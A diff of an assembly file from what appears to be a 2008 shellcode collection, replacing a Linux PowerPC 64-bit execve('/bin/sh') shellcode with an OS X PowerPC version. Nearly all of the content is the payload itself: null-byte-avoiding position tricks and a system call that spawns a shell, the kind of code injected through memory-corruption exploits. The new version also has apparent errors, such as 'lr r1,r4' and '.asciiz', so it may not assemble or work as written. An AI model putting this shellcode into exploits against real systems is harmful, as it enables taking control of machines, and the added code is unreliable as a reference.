@@ -1,5 +1,5 @@
 /*
- *  lin-power-shellcode64.S
+ *  osx-ppc-shellcode.s
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -18,24 +18,22 @@
  *
  */
 
-#include "linux-power.h"
+.global _start
 
-    .globl main
+_start:
 
-main:
+# 00 bytes
 
-shellcode64:
-    lil     %r31,__CAL
-    xor.    %r5,%r5,%r5
-    bnel    shellcode64
-    mflr    %r30
-    cal     %r30,511(%r30)
-    cal     %r3,-511+36(%r30)
-    stb     %r5,-511+43(%r30)
-    stdu    %r5,-8(%r1)
-    stdu    %r3,-8(%r1)
-    mr      %r4,%r1
-    cal     %r0,__NC_execve(%r31)
-    .long   0x44ffff02
-    .asciz  "/bin/sh"
+shellcode:
+    xor.    r5,r5,r5
+    bnel    shellcode
+    mflr    r31
+    addi    r3,r31,32
+    stwu    r5,-4(r1)
+    stwu    r3,-4(r1)
+    lr      r1,r4
+    li      r0,59
+    sc
+
+.asciiz "/bin/sh"
 
